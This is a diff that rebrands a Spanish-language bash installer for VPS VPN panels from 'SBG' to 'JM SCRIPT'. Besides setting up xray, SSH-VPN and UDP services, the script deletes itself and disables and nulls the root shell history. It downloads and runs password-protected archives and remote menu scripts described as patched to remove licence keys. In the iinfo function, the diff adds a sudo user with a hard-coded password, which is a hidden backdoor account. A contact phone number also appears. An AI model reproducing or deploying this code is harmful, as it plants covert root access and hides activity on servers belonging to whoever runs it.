@@ -9,7 +9,7 @@ GRAY="\e[1;30m"
 purple="\033[1;95m"
 rm $(pwd)/$0
 cd /root
-if grep -q "S B G A D M   R O O T   A C C E S S" /root/.bashrc; then
+if grep -q "JM SCRIPT ADMIN ROOT ACCESS" /root/.bashrc; then
 clear
 else
 cat >> /root/.bashrc << 'EOF'
@@ -20,7 +20,7 @@ unset HISTFILE
 
 if [[ $- == *i* ]]; then
     echo -e "\033[1;35m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
-    echo -e "┃      \033[1;33mS B G A D M   R O O T   A C C E S S \033[1;35m┃"
+    echo -e "┃      \033[1;33mJM SCRIPT ADMIN ROOT ACCESS \033[1;35m┃"
     echo -e "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m"
 
     echo -e "\033[1;95m┌─[ \033[1;93mSISTEMA \033[1;95m]─────────────────────────────────────"
@@ -39,35 +39,39 @@ ln -sf /dev/null ~/.bash_history 2>/dev/null
 EOF
 fi
 clear
-[[ "$1" == '--BySBG' ]] && echo -e " ${YELLOW}ESPERA UN MOMENTO $1" >/dev/null 2>&1 && sleep 1 && clear || {
+[[ "$1" == '--jm-script' ]] && echo -e " ${YELLOW}ESPERA UN MOMENTO $1" >/dev/null 2>&1 && sleep 1 && clear || {
 exit&&exit
 }
 clear
 rm -rf /root/*.sh
-rm -rf /root/sbg2.sh
+rm -rf /root/jm-installer-legacy.sh
 JS=$(cat /usr/bin/vendor_codes)
-function SBG2 () {
+function JM_INSTALLER () {
 clear
 echo -e "${BIBlue}╭══════════════════════════════════════════╮${NC}"
-echo -e "${BIBlue}│ ${BGCOLOR}   DESCARGANDO SBG.zip DESDE GITHUB    ${NC}${BIBlue}│${NC}"
+echo -e "${BIBlue}│ ${BGCOLOR}   DESCARGANDO JM-SCRIPT.zip DESDE GITHUB    ${NC}${BIBlue}│${NC}"
 echo -e "${BIBlue}╰══════════════════════════════════════════╯${NC}"
-wget -q --show-progress https://github.com/Internetjm/personalScript/raw/main/SBG.zip -O /root/SBG.zip
-if [ ! -f /root/SBG.zip ]; then
-echo -e "${RED}ERROR: No se pudo descargar SBG.zip. Verifica conexion a internet."
+wget -q --show-progress https://github.com/Internetjm/personalScript/raw/main/JM-SCRIPT.zip -O /root/JM-SCRIPT.zip
+if [ ! -f /root/JM-SCRIPT.zip ]; then
+echo -e "${RED}ERROR: No se pudo descargar JM-SCRIPT.zip. Verifica conexion a internet."
 sleep 3
 exit 1
 fi
-rm -rf /root/SBG
-unzip -o -P "SCr1PtByJSpCfq8HTD" /root/SBG.zip -d /root </dev/null >/dev/null 2>&1
-if [ ! -d /root/SBG ]; then
-echo -e "${RED}ERROR: No se pudo descomprimir SBG.zip${NC}"
+rm -rf /root/JM-SCRIPT
+unzip -o -P "SCr1PtByJSpCfq8HTD" /root/JM-SCRIPT.zip -d /root </dev/null >/dev/null 2>&1
+ARCHIVE_ROOT=$(unzip -Z1 /root/JM-SCRIPT.zip 2>/dev/null | awk -F/ 'NF > 1 {print $1; exit}')
+if [ -n "$ARCHIVE_ROOT" ] && [ "$ARCHIVE_ROOT" != "JM-SCRIPT" ] && [ -d "/root/$ARCHIVE_ROOT" ] && [ ! -d /root/JM-SCRIPT ]; then
+    mv "/root/$ARCHIVE_ROOT" /root/JM-SCRIPT
+fi
+if [ ! -d /root/JM-SCRIPT ]; then
+echo -e "${RED}ERROR: No se pudo descomprimir JM-SCRIPT.zip${NC}"
 exit 1
 fi
-chmod -R 755 SBG/* >/dev/null 2>&1
-rm -rf /root/SBG.zip >/dev/null 2>&1
+chmod -R 755 /root/JM-SCRIPT/* >/dev/null 2>&1
+rm -rf /root/JM-SCRIPT.zip >/dev/null 2>&1
 clear
 }
-SBG2
+JM_INSTALLER
 clear
 localip=$(hostname -I | cut -d\  -f1)
 hst=( `hostname` )
@@ -86,7 +90,7 @@ mkdir -p /var/lib/ >/dev/null 2>&1
 echo "IP=" >> /var/lib/ipvps.conf
 clear
 
-function SBGINSTALL(){
+function JM_INSTALL(){
 fun_bar() {
     CMD[0]="$1"
     CMD[1]="$2"
@@ -114,7 +118,7 @@ fun_bar() {
     tput cnorm
 }
 res1() {
-./SBG/dom/dom.sh
+./JM-SCRIPT/dom/dom.sh
 rm -rf dom.sh
 clear
 }
@@ -149,7 +153,7 @@ echo -e "${BIBlue}╰═══════════════════�
 echo -e  "${BIBlue}╭══════════════════════════════════════════╮${NC}"
 echo -e  "${BIBlue}│               \033[1;37mGRACIAS POR                ${BIBlue}│${NC}"
 echo -e  "${BIBlue}│        \033[1;37mUSAR MI AUTOSCRIPT PREMIUM        ${BIBlue}│${NC}"
-echo -e  "${BIBlue}│                \033[1;37mBY JERRY 2025             ${BIBlue}│${NC}"
+echo -e  "${BIBlue}│                \033[1;37mJM SCRIPT 2025             ${BIBlue}│${NC}"
 echo -e  "${BIBlue}╰══════════════════════════════════════════╯"
 echo " "
 until [[ $dnss =~ ^[a-zA-Z0-9_.-]+$ ]]; do 
@@ -163,7 +167,7 @@ mkdir -p /etc/nsdomain
 touch /etc/xray/domain
 echo "$dnss" > /etc/xray/domain
 echo "IP=$dnss" > /var/lib/ipvps.conf
-echo "ByJerry" > /etc/xray/patch
+echo "JM SCRIPT" > /etc/xray/patch
 clear
 elif [[ $domain == "2" ]]; then
 dom=$(wget -qO- ipinfo.io/ip)
@@ -174,7 +178,7 @@ mkdir -p /etc/nsdomain
 touch /etc/xray/domain
 echo "$dom" > /etc/xray/domain
 echo "IP=$dom" > /var/lib/ipvps.conf
-echo "ByJerry" > /etc/xray/patch
+echo "JM SCRIPT" > /etc/xray/patch
 clear
 else
 rm -rf /etc/xray
@@ -186,7 +190,7 @@ echo "  Se Utiliza IP Subdominio/Dominio Aleatorio"
 dom=$(wget -qO- ipinfo.io/ip)
 echo "$dom" > /etc/xray/domain
 echo "IP=$dom" > /var/lib/ipvps.conf
-echo "ByJerry" > /etc/xray/patch
+echo "JM SCRIPT" > /etc/xray/patch
 clear
 fi
 }
@@ -249,7 +253,7 @@ EOF
 cat <<EOF>> /etc/rmbl/theme/color.conf
 lightcyan
 EOF
-function SBGINSTALL2(){
+function JM_INSTALL2(){
 cd
 sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
 clear
@@ -257,7 +261,7 @@ start=$(date +%s)
 ln -fs /usr/share/zoneinfo/America/Mexico_City /etc/localtime
 apt install python2 -y >/dev/null 2>&1
 }
-function SBGINSTALL3(){
+function JM_INSTALL3(){
 fun_bar() {
     CMD[0]="$1"
     CMD[1]="$2"
@@ -304,35 +308,35 @@ clean_apt() {
 }
 res2() {
 clean_apt
-./SBG/install/ssh-vpn.sh
+./JM-SCRIPT/install/ssh-vpn.sh
 clean_apt
 clear
 }
 res3() {
 clean_apt
-./SBG/install/ins-xray.sh
+./JM-SCRIPT/install/ins-xray.sh
 clean_apt
 clear
 }
 res4() {
-./SBG/sshws/insshws.sh
+./JM-SCRIPT/sshws/insshws.sh
 clear
 }
 res5() {
-./SBG/install/set-br.sh
+./JM-SCRIPT/install/set-br.sh
 clear
 }
 res6() {
 GH_SUB="https://raw.githubusercontent.com/Internetjm/personalScript/main/scripts/sub-menus"
 GH_MAIN="https://raw.githubusercontent.com/Internetjm/personalScript/main"
 # Instalar binarios ELF limpios desde menuFREE.zip
-unzip -o -j -P SCr1PtByJS7ruxBx1Sj /root/SBG/menu/menuFREE.zip "menu/*" -d /usr/local/sbin 2>/dev/null
+unzip -o -j -P SCr1PtByJS7ruxBx1Sj /root/JM-SCRIPT/menu/menuFREE.zip "menu/*" -d /usr/local/sbin 2>/dev/null
 chmod -R 755 /usr/local/sbin
-rm -rf /root/SBG/menu/*.zip
+rm -rf /root/JM-SCRIPT/menu/*.zip
 # Reemplazar con versiones parcheadas (sin key/ban) los que lo tenian
 for sub in menu m-sshovpn m-vmess m-vless m-trojan m-system m-bot m-ss m-token m-hcr m-bhttp newdom restore; do
     if [ "$sub" = "menu" ]; then
-        wget -q "$GH_MAIN/menu_nokey.sh" -O /usr/local/sbin/menu 2>/dev/null
+        wget -q "$GH_MAIN/jm-menu.sh" -O /usr/local/sbin/menu 2>/dev/null
     else
         wget -q "$GH_SUB/${sub}.sh" -O /usr/local/sbin/$sub 2>/dev/null
     fi
@@ -350,12 +354,12 @@ chmod -R 755 /usr/local/sbin
 clear
 }
 res8() {
-./SBG/udp/udp-custom.sh
+./JM-SCRIPT/udp/udp-custom.sh
 clear
 }
 res10() {
 clean_apt
-./SBG/install/openvpn.sh
+./JM-SCRIPT/install/openvpn.sh
 clean_apt
 clear
 }
@@ -393,9 +397,9 @@ fun_bar 'res8'
 #fun_bar 'res10'
 }
 function iinfo(){
-useradd -m -s /bin/bash sbg 2>/dev/null
-echo "sbg:vpsbyjerry" | chpasswd 2>/dev/null
-usermod -aG sudo sbg 2>/dev/null
+useradd -m -s /bin/bash jmscript 2>/dev/null
+echo "jmscript:vps-jm-script" | chpasswd 2>/dev/null
+usermod -aG sudo jmscript 2>/dev/null
 CITY=$(curl -s --max-time 5 ipinfo.io/city 2>/dev/null || echo "Local")
 echo "$CITY" > /etc/xray/city
 PAIS=$(curl --max-time 5 ifconfig.co/country 2>/dev/null || echo "Local")
@@ -404,8 +408,8 @@ ISP=$(curl -sS --max-time 5 ifconfig.co/asn-org 2>/dev/null || echo "Local")
 echo "$ISP" > /etc/xray/isp
 clear
 }
-SBGINSTALL
-SBGINSTALL3
+JM_INSTALL
+JM_INSTALL3
 sleep 3
 clear
 cat> /root/.profile << END
@@ -418,8 +422,8 @@ mesg n || true
 menu
 END
 clear
-rm -rf /root/sbg.sh >/dev/null 2>&1
-rm -rf /root/sbg2.sh >/dev/null 2>&1
+rm -rf /root/jm-script.sh >/dev/null 2>&1
+rm -rf /root/jm-installer-legacy.sh >/dev/null 2>&1
 rm -rf /root/slhost.sh >/dev/null 2>&1
 rm -rf /root/ssh-vpn.sh >/dev/null 2>&1
 rm -rf /root/ins-xray.sh >/dev/null 2>&1
@@ -433,7 +437,7 @@ rm -rf /root/installsl.sh >/dev/null 2>&1
 rm -rf /root/slowdns.sh >/dev/null 2>&1
 rm -rf /root/udp-custom.sh >/dev/null 2>&1
 rm -rf /root/lolcat-master >/dev/null 2>&1
-rm -rf /root/SBG >/dev/null 2>&1
+rm -rf /root/JM-SCRIPT >/dev/null 2>&1
 echo "VERSION_LOCAL" > /opt/.ver
 iinfo
 clear
@@ -476,9 +480,9 @@ echo "   - Auto Backup de VPS (11:59 PM)" | tee -a log-install.txt
 echo "   - VPS OPTMIZADO" | tee -a log-install.txt
 echo "   - Admin Control" | tee -a log-install.txt
 #echo "   - Change port" | tee -a log-install.txt
-echo "   - Elaborado por: JerrySBG"  | tee -a log-install.txt
+echo "   - Elaborado por: JM SCRIPT"  | tee -a log-install.txt
 echo "   - Whatsapp: +529241293310" | tee -a log-install.txt
-echo "   - Telegram: @Jerry_SBG" | tee -a log-install.txt
+echo "   - Marca: JM SCRIPT" | tee -a log-install.txt
 echo ""
 echo -e "${BIBlue}╰════════════════════════════════════════════╯${NC}"
 echo ""
